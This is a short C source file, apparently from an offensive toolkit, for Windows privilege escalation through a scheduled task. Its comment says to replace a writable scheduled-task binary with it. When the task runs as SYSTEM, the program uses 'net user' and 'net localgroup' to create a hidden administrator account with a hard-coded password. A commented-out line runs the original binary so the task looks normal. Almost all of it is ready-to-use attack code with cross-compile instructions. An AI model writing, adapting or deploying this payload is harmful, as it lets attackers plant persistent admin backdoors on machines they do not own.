#include <stdlib.h>
#include <stdio.h>

/*
 * win-sched-task - Scheduled Task Binary Replacement
 *
 * Replace a writable scheduled task binary with this.
 * When the task fires (as SYSTEM/admin), it creates a new admin user.
 *
 * Cross-compile:
 *   x86_64-w64-mingw32-gcc main.c -o sched_task.exe
 *
 */

// -- CONFIGURE THESE --------------------------------------
#define USERNAME "taskadmin"
#define PASSWORD "T@sk_P@ss1!"
// ---------------------------------------------------------

int main(void) {
    system("net user " USERNAME " " PASSWORD " /add");
    system("net localgroup Administrators " USERNAME " /add");

    /* Optional: execute the original binary so the task looks normal */
    // system("C:\\Original\\Path\\Backup.exe");

    return 0;
}
